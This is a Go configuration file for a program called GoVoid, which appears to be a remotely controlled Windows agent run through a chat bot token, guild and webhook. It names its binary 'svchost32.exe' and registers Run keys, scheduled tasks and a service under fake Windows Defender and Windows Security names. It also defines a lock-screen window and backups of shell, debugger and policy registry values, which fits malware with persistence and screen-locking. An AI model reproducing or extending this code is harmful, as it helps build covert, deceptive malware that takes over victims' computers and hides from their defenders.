package config

import (
	"os"
	"path/filepath"
)

var (
	ProductID = "GoVoid"

	AppName = "GoVoid"

	BotToken = ""

	GuildID = ""

	WebhookURL = ""

	CategoryID = ""

	ChannelPrefix = "sesion-"

	BinaryName = "svchost32.exe"

	RunKeyName = "WindowsSecurityUpdate"

	TaskLogonName = "WindowsDefenderUpdate"
	TaskBootName  = "WindowsDefenderUpdateBoot"

	ServiceDisplayName = "Windows Security Shield"
)

var (
	MutexName = `Local\` + ProductID + `AgentSingleInstance`

	GuardMutexFmt = `Local\` + ProductID + `LockGuard%d`

	WindowClassPrefix = ProductID + `LockScreen`

	ServiceName     = ProductID + `Shield`
	ServiceTaskName = ProductID + `ShieldGuard`

	TaskWatchdogName = ProductID + `Watchdog`

	DataDirName = ProductID

	ShellBackupValue    = ProductID + `ShellBackup`
	DebuggerBackupValue = ProductID + `DebuggerBackup`
	PolicyBackupPrefix  = ProductID + `Backup`
	PolicyMarkerPrefix  = ProductID + `Had`
)

func StateDir() string {
	if programData := os.Getenv("ProgramData"); programData != "" {
		return filepath.Join(programData, DataDirName)
	}
	if dir, err := os.UserConfigDir(); err == nil && dir != "" {
		return filepath.Join(dir, DataDirName)
	}
	return filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", DataDirName)
}
